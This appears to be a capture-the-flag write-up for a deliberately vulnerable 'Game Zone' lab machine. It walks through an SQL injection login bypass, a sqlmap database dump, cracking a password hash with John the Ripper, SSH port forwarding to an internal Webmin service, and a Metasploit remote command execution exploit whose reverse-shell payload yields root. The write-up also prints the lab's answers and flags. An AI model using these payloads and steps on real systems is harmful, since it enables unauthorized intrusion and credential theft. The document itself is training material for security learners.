# Game Zone
This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 

# Task 1 Deploy the vulnerable machine

First quick NMAP scan:
```
nmap -Pn -sV 10.67.177.222
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-24 19:34 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.67.177.222
Host is up (0.00030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```
Looks like just port 22 and 80.

## Q1 What is the name of the large cartoon avatar holding a sniper on the forum?
Answer: Agent 47 from the game "hitman: codename 47" is obtainable from tineye aswell. From tineye seems like it might be linked from xbox game "hitman abolution".

# Task 2 Obtain access via SQLi
In this task you will understand more about SQL (structured query language) and how you can potentially manipulate queries to communicate with the database.

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

SELECT * FROM users WHERE username = :username AND password := password

In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.

Here a vulnerability is taken advantage of by including in the username and leaving password blank: 
' or 1=1 -- - 

The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.

## Q1 When you've logged in, what page do you get redirected to?
Answer: portal.php

# Task 3 Using SQLMap

- We're going to use SQLMap to dump the entire database for GameZone.

- Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

- First we need to intercept a request made to the search feature using BurpSuite.

- Intercept a basic request which will be used in SQLmap and copy it's text from burpe suite into a text file.
- Pass this request text file into SQLmap, which will take advantage of the authenticated user session to dump entire database.
- Run:
  sql -r request.txt --dbms=mysql --dump
  where:
  -r uses the intercepted request you saved earlier
  --dbms tells SQLMap what type of database management system it is
  --dump attempts to outputs the entire database

  - Acknowledge Yes for further testing, and storing hashes in temporary file.
  - Use the default dictionary for wordlists.tx_.
  - Use common password suffixes y (its slow but gets it done).

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
└─$ sqlmap -r /mnt/CTF/Game_Zone/request.txt --dbms=mysql --dump
        ___
       __H__                                                                                        ___ ___[,]_____ ___ ___  {1.9.8#stable}                                                           |_ -| . [']     | .'| . |                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                 
...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
...
...
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
...
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+---------------------------------------------------------
...
[03:13:03] [INFO] table 'db.post' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>/dump/db/post.csv'                      ...
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[03:13:14] [INFO] writing hashes to a temporary file '/tmp/sqlmapkoglbk6r247838/sqlmaphashes-tz21s7dm.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[03:13:22] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[03:13:35] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
...                         
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[03:15:09] [INFO] table 'db.users' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/users.csv'                                                                                                                      
[03:15:09] [INFO] fetched data logged to text files under '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>'
[03:15:09] [WARNING] your sqlmap version is outdated

[*] ending @ 03:15:09 /2026-04-26/
```
## Q1 In the users table, what is the hashed password?
Answer: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

## Q2 What was the username associated with the hashed password?
Answer: agent47

## Q3 What was the other table name?
Answer: POST

# Task4 Cracking a password with JohnTheRipper
Here we already have the hash and aparently its a sha256

john --format=raw-sha256 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

hash.txt - contains a list of your hashes (in your case its just 1 hash)
--wordlist - is the wordlist you're using to find the dehashed value
--format - is the hashing algorithm used. In our case its hashed using SHA256.


## Q1 What is the de-hashed password?
Answer: videogamer124

## Q2 Now you have a password and username. Try SSH'ing onto the machine. What is the user flag?
```
$ ssh agent47@<TargetIP>                                            
The authenticity of host '<TargetIP> (<TargetIP>)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '<TargetIP>' (ED25519) to the list of known hosts.
agent47@<TargetIP>'s password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from <AttackBoxIP>
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
agent47@gamezone:~$ exit
logout
Connection to <TargetIP> closed.
```
Answer: 649ac17b1480ac13ef1e4fa579dac95c

# Task 5 Exposing services with reverse SSH tunnels

Local Port Forwarding (‑L)
Local port forwarding lets you “pull” a remote service through an SSH server. Your machine listens on a local port, and traffic sent to that port is forwarded through the SSH connection to a destination the SSH server can reach.

Example:
```
ssh -L 9000:example.com:80 user@example.com
```
Visiting: http://localhost:9000
sends the request through the SSH server, which then connects to example.com:80 on your behalf. This technique is commonly used to access services blocked on the local network or to route traffic through a trusted remote host.

## Q1 We will use a tool called 'ss' to investigate sockets running on a host. How many TCP sockets are running?

If we run ss -tulpn it will tell us what socket connections are running

Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn't resolve service names

Answer: 5 TCP only.

```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp   UNCONN     0      0        *:68                   *:*                  
udp   UNCONN     0      0        *:10000                *:*                  
tcp   LISTEN     0      80     127.0.0.1:3306                 *:*                  
tcp   LISTEN     0      128      *:10000                *:*                  
tcp   LISTEN     0      128      *:22                   *:*                  
tcp   LISTEN     0      128     :::80                  :::*                  
tcp   LISTEN     0      128     :::22                  :::*                  
agent47@gamezone:~$ ss -tulp
```
Given point 10000 is the port of interest on target its possible to use 10000 locally but to avoid confusion on attacking vm i will use port 9000 to help clarify this:
To connect to the service on port 10000 on target by port 9000 on localhost we can simply use:
ssh -L 9000:localhost:10000 <username>@<TargetIP>

you can include flags when connect with these just runs in background:
Don’t open a shell (-N)
Run in background (-f)

## Note this will fail if the proxy from earlier SQLi request capture is still on so be sure to disable it.

## Q2 What is the name of the exposed CMS?
Answer: Webmin appears in the top of the login screen or in code in title section: 
<Title> Login to Webmin </Title>

## Q3 What is the CMS version?
Answer: 1.580, login to webmin is the same password as to connect with SSH. Then its displayed in main screen on login or in the "System Information link".

# Task 6 Privilege Escalation with Metasploit

Next take advantage of webadmin to gain by searching for exploit through searchsploit, this lead us to finding a exploit is available through metasploit.

```
msf > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution                                               
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure                                                                       
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE                                                                      
...

msf > use 0
msf exploit(unix/webapp/webmin_show_cgi_exec) > set RHOSTS localhost
RHOSTS => localhost
msf exploit(unix/webapp/webmin_show_cgi_exec) > set RPORT 9000
RPORT => 9000
msf exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
USERNAME => agent47
msf exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
PASSWORD => videogamer124
msf exploit(unix/webapp/webmin_show_cgi_exec) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false

msf exploit(unix/webapp/webmin_show_cgi_exec) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   10  payload/cmd/unix/reverse_python             .                normal  No     Unix Command Shell, Reverse TCP (via Python)
   11  payload/cmd/unix/reverse_python_ssl         .                normal  No     Unix Command Shell, Reverse TCP SSL (via python)
   12  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   13  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   14  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf exploit(unix/webapp/webmin_show_cgi_exec) > set payload 8

First I tried rever_perl but this failed i then tried another reverse which seemed to work. Like the hint says its about getting the right payload.

payload => cmd/unix/reverse_perl
msf exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
lhost => tun0
msf exploit(unix/webapp/webmin_show_cgi_exec) > run
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 192.168.159.255:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Exploiting target ::1
[*] Started reverse TCP handler on 192.168.159.255:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Exploit completed, but no session was created.
```
Failed here next tried payload 6:
```
msf exploit(unix/webapp/webmin_show_cgi_exec) > set payload 6
payload => cmd/unix/reverse
msf exploit(unix/webapp/webmin_show_cgi_exec) > run
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP double handler on 192.168.159.255:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Cer0s8sq1flmMyP1;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "Cer0s8sq1flmMyP1\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.159.255:4444 -> 10.49.181.12:49764) at 2026-04-29 14:25:21 +1000
[*] Session 1 created in the background.
[*] Exploiting target ::1
[*] Started reverse TCP double handler on 192.168.159.255:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Payload executed successfully
[*] Command: echo kIzoCXjnV7tiqvh0;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "kIzoCXjnV7tiqvh0\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 2 opened (192.168.159.255:4444 -> 10.49.181.12:49772) at 2026-04-29 14:25:31 +1000
[*] Session 2 created in the background.
```
Success!
```
msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -l

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49764 (127.
                                         0.0.1)
  2         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49772 (::1)

msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 2
[*] Starting interaction with 2...

whoami
root
pwd
/usr/share/webmin/file/
cd /root
pwd
/root
ls
root.txt
cat root.txt
a4b945830144bdd71908d12d902adeee
```
## Q1 What is the root flag?
Answer: a4b945830144bdd71908d12d902adeee
Double check session I assumed failed and it actually worked.
```
Background session 2? [y/N]  y
msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -l

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49764 (127.
                                         0.0.1)
  2         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49772 (::1)

msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 1
[*] Starting interaction with 1...

whoami
root
cd /root
pwd
/root
ls
root.txt
```

```
